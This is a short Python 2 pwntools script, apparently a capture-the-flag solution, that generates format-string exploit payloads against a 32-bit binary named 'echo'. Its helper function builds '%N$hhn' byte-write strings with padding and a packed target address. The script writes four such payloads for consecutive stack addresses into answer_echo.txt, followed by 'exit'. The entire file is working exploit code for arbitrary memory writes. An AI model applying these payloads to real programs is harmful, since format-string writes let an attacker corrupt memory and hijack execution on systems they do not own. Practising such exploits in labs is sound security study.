#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math
context(arch = "i386",os = "linux", log_level = "debug")

def gen_write_byte_format_string_i386(byte_value, write_address, fmtstr_shift_position, padding='0'):
    # Placing: Align4(Padding Characters(Output_Count = byte_value), Fmtstr), Write Address
    first_padding = padding * byte_value
    flag = True
    align_part_align_length = int(math.ceil(float(byte_value) / 4) + 2)
    fmt_str = "%%%d$hhn" % (fmtstr_shift_position + align_part_align_length)
    result_1 = first_padding + fmt_str
    result_1 += (align_part_align_length * 4 - len(result_1)) * padding
    result = result_1 + p32(write_address)
    return result

with open("answer_echo.txt", "w") as f:
    f.write(gen_write_byte_format_string_i386(1, 0xffffce0c, 7))
    f.write("\n")
    f.write(gen_write_byte_format_string_i386(2, 0xffffce0d, 7))
    f.write("\n")
    f.write(gen_write_byte_format_string_i386(3, 0xffffce0e, 7))
    f.write("\n")
    f.write(gen_write_byte_format_string_i386(4, 0xffffce0f, 7))
    f.write("\n")
    f.write("exit")
    f.write("\n")


#p = process('./echo')
#elf = ELF('./echo')


